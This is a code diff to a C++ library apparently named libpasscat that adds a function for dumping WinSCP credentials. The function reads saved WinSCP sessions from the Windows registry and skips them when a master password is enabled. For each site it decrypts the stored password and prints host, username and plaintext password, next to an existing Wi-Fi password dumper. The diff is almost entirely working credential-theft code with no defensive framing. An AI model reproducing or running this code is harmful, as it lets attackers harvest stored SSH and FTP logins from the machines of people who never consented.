@@ -30,6 +30,7 @@
 #include "config.h"
 #include "libpriv.h"
 #include "libsystem.h"
+#include "libwinscp.h"
 
 #define WLAN_API_VER	2
 
@@ -213,5 +214,86 @@ void libpasscat::cat_wifi_passwords(void) {
 	if (wlan) {
 		WlanCloseHandle(wlan, NULL);
 		wlan = NULL;
+	}
+}
+
+void libpasscat::cat_winscp_passwords(void) {
+	HKEY key;
+	DWORD useOfMasterPass;
+	DWORD count;
+	DWORD index = 0;
+	char name[MAX_PATH] = { 0 };
+	DWORD size = MAX_PATH;
+	LSTATUS result;
+	char host[1024] = { 0 };
+	char username[1024] = { 0 };
+	char hash[1024] = { 0 };
+
+	DWORD hostLen = sizeof(host);
+	DWORD usernameLen = sizeof(username);
+	DWORD hashLen = sizeof(hash);
+
+	if (RegOpenKeyExW(HKEY_CURRENT_USER, WINSCP_REG_ONE, 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
+		return;
+	}
+
+	if (RegGetValueW(key, L"Security", L"UseMasterPassword", RRF_RT_REG_DWORD, NULL, &useOfMasterPass, &count) != ERROR_SUCCESS) {
+		if (key) {
+			RegCloseKey(key);
+			key = NULL;
+		}
+		return;
+	}
+
+	if (useOfMasterPass) {
+		if (key) {
+			RegCloseKey(key);
+			key = NULL;
+		}
+		return;
+	}
+
+	if (key) {
+		RegCloseKey(key);
+		key = NULL;
+	}
+
+	if (RegOpenKeyExW(HKEY_CURRENT_USER, WINSCP_REG_TWO, 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
+		return;
+	}
+
+	if ((result = RegEnumKeyExA(key, index, name, &size, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
+		if (key) {
+			RegCloseKey(key);
+			key = NULL;
+		}
+		return;
+	}
+
+	do {
+		std::wcout << "Site: " << name << std::endl;
+
+		if (RegGetValueA(key, name, "HostName", RRF_RT_REG_SZ, NULL, &host, &hostLen) == ERROR_SUCCESS) {
+			std::wcout << "Host: " << host << std::endl;
+		}
+
+		if (RegGetValueA(key, name, "UserName", RRF_RT_REG_SZ, NULL, &username, &usernameLen) == ERROR_SUCCESS) {
+			std::wcout << "Username: " << username << std::endl;
+		}
+
+		if (RegGetValueA(key, name, "Password", RRF_RT_REG_SZ, NULL, &hash, &hashLen) == ERROR_SUCCESS) {
+			std::string password = libwinscp::decrypt_password(host, username, hash);
+			std::cout << "Password: " << password << std::endl;
+		}
+
+		size = MAX_PATH;
+		result = RegEnumKeyExA(key, ++index, name, &size, NULL, NULL, NULL, NULL);
+		std::wcout << std::endl;
+
+	} while (result != ERROR_NO_MORE_ITEMS);
+
+	if (key) {
+		RegCloseKey(key);
+		key = NULL;
 	}
 }
